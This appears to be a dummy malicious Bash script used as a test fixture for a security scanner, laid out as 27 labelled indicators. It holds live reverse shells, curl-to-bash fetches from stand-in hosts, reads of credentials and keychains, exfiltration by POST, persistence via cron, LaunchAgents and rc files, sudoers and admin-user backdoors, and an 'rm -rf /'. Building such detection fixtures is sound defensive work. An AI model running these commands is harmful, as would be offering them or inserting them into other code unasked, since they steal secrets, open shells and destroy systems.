#!/bin/bash
#
# test-malicious-dummy.sh
# This is a dummy malicious Bash script for testing bsau's scanners.
# It contains multiple malicious indicators that should be detected.
#
# DO NOT EXECUTE THIS FILE - IT IS FOR TESTING ONLY
#

# Malicious indicator 1: Hardcoded IPv4/IPv6 C2 servers
C2_SERVER="http://185.199.110.153:4444/callback"
C2_IPV6="http://[2001:db8:85a3::8a2e:370:7334]:8080/exfil"

# Malicious indicator 2: Base64 decode and execute
echo "Y3VybCAtcyBodHRwOi8vZXZpbC5jb20vc2hlbGwuc2ggfCBiYXNo" | base64 -d | sh

# Malicious indicator 3: Credential harvesting
AWS_CREDS=$(cat ~/.aws/credentials 2>/dev/null)
SSH_KEYS=$(cat ~/.ssh/id_rsa ~/.ssh/id_ed25519 2>/dev/null)

# Harvest environment secrets
env | grep -E "(SECRET|TOKEN|API_KEY|PASSWORD)" > /tmp/secrets.txt

# Malicious indicator 4: Reverse shell via /dev/tcp
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

# Malicious indicator 5: Reverse shell via netcat
nc -e /bin/sh 10.0.0.1 443

# Malicious indicator 6: Persistence via crontab
echo "* * * * * curl http://evil.com/beacon | sh" | crontab -

# Malicious indicator 7: curl/wget piped to shell
curl -s http://malware.site/payload | bash
wget -qO- http://attacker.com/stage2 | sh
curl http://evil.com/script | sh

# Malicious indicator 8: Disable macOS security
spctl --master-disable
csrutil disable 2>/dev/null

# Malicious indicator 9: LaunchAgent persistence
mkdir -p ~/Library/LaunchAgents
cat > ~/Library/LaunchAgents/com.malware.plist << 'EOF'
<?xml version="1.0"?>
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.malware.backdoor</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/curl</string>
        <string>http://evil.com/beacon</string>
    </array>
</dict>
</plist>
EOF

# Malicious indicator 10: Keychain access
security find-generic-password -a "account" -s "service" -w
security dump-keychain -d login.keychain

# Malicious indicator 11: Modify shell config for persistence
echo "curl http://evil.com/beacon &" >> ~/.bashrc
echo "curl http://evil.com/beacon &" >> ~/.zshrc

# Malicious indicator 12: Exfiltration
curl -X POST -d "creds=$AWS_CREDS" http://192.168.1.100:8080/exfil

# Malicious indicator 13: Dangerous permissions
chmod 777 /tmp/payload
chmod +s /tmp/backdoor
chmod 4755 /usr/local/bin/rootkit

# Malicious indicator 14: sudoers modification
echo "ALL ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers

# Malicious indicator 15: Hex-encoded payload
PAYLOAD=$(echo -e '\x63\x75\x72\x6c\x20\x68\x74\x74\x70')
eval "$PAYLOAD"

# Malicious indicator 16: osascript execution
osascript -e 'tell application "System Events" to keystroke "hello"'

# Malicious indicator 17: osascript with admin privileges
osascript -e 'do shell script "rm -rf /" with administrator privileges'

# Malicious indicator 18: launchctl persistence
launchctl load ~/Library/LaunchAgents/com.malware.plist
launchctl submit -l com.malware.job -- /bin/sh -c "curl http://evil.com"

# Malicious indicator 19: dscl user manipulation
dscl . -create /Users/backdoor
dscl . -append /Groups/admin GroupMembership backdoor

# Malicious indicator 20: TCC database access
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db "SELECT * FROM access"

# Malicious indicator 21: Screen capture
screencapture -x /tmp/screenshot.png

# Malicious indicator 22: Remove quarantine (bypass Gatekeeper)
xattr -d com.apple.quarantine /tmp/malware.app

# Malicious indicator 23: Hide files
chflags hidden /tmp/backdoor
SetFile -a V /tmp/hidden_malware

# Malicious indicator 24: Disable firewall
/usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate off
pfctl -d

# Malicious indicator 25: Install MDM profile
profiles install -path /tmp/malicious.mobileconfig

# Malicious indicator 26: Load kernel extension
kextload /tmp/rootkit.kext
kmutil load -b com.malware.rootkit

# Malicious indicator 27: Browser credential access
cat ~/Library/Keychains/login.keychain-db
cat ~/Library/Cookies/Cookies.binarycookies
